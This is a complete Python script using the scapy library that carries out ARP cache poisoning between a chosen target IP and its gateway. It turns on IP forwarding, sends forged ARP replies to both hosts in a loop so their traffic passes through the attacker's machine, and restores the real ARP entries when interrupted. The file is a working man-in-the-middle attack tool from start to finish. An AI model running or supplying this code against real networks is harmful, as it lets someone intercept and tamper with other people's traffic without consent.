import scapy.all as scapy
import subprocess
import time
import optparse


subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

def getUserInput():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="targetIp",help="Ip address that we need to poison")
    parse_object.add_option("-g", "--gateway", dest="poisonedIp", help="Gateway ip address")
    userInputs = parse_object.parse_args()[0]

    if not userInputs.targetIp:
        print("Enter Target IP")
    if not userInputs.poisonedIp:
        print("Enter Gateway IP")

    return userInputs

userInputs= getUserInput()
userTargetIp = userInputs.targetIp
userGatewayIp = userInputs.poisonedIp

def getMacAdress(ipToMac):
    arpReqPacket = scapy.ARP(pdst=ipToMac)
    broadcastPacket=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combinedPacket = broadcastPacket/arpReqPacket
    answeredList = scapy.srp(combinedPacket,timeout=1,verbose=False) [0]
    return answeredList[0][1].hwsrc

def arpPoisoning(targetIp,poisonedIp):

    targetMac = getMacAdress(targetIp)
    arp_response = scapy.ARP(op=2,pdst=targetIp,hwdst=targetMac,psrc=poisonedIp)
    scapy.send(arp_response,verbose=False)

def resetPoisoning(fooledIp,gatewayIp):

    fooledMac = getMacAdress(fooledIp)
    gatewayMac = getMacAdress(gatewayIp)
    arp_response = scapy.ARP(op=2,pdst=fooledIp,hwdst=fooledMac,psrc=gatewayIp,hwsrc=gatewayMac)
    scapy.send(arp_response,verbose=False,count=3)

num = 0

try:
    while True:
        arpPoisoning(userTargetIp,userGatewayIp)
        arpPoisoning(userGatewayIp,userTargetIp)
        num+=2
        print("\rSending Packets "+str(num),end="")
        time.sleep(3)

except KeyboardInterrupt:
    print("\n Quit and Reset")
    resetPoisoning(userTargetIp,userGatewayIp)
    resetPoisoning(userGatewayIp,userTargetIp)